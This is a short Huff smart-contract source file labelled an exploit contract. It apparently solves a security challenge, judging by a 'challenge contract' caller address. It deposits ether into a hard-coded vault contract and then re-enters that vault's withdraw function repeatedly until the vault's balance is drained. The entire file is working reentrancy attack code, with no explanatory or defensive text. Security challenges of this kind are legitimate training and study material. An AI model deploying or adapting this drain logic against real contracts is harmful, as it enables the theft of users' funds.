#include "../lib/huffmate/src/math/Math.huff"

// This huff contract is CALLed by challenge contract.
#define constant CHALLENGE_ADDRESS = 0xfEeDC0DE00000000000000000000000000000000

// Vulnerable contract interface.
#define constant VAULT_ADDRESS = 0x4330E5E62a8FB0219900b20f4c6C78D11Bf9D1f5
#define function deposit() payable returns ()
#define function withdraw(uint256) nonpayable returns ()

// Exploit contract
#define macro MAIN() = takes (0) returns (0) {
    [CHALLENGE_ADDRESS] caller sub reenter jumpi

    deposit:
        // CALL vault.deposit{value: balance}()
        0x00 0x00 // return size offset
        __FUNC_SIG(deposit) 0x00 mstore 0x04 0x1c // args size offset
        address balance dup1 0x00 sstore // deposit value
        [VAULT_ADDRESS] gas call
    
    reenter:
        0x00 sload // [deposit]
        [VAULT_ADDRESS] balance // [loot, deposit]
        MIN() // [amt]
        0x00 dup2 eq done jumpi
        0x20 mstore // []
        __FUNC_SIG(withdraw) 0x00 mstore // []
        // CALL vault.withdraw(amt)
        0x00 0x00 // return size offset
        0x24 0x1c // args size offset
        0x00 [VAULT_ADDRESS] gas call

    done: stop
}
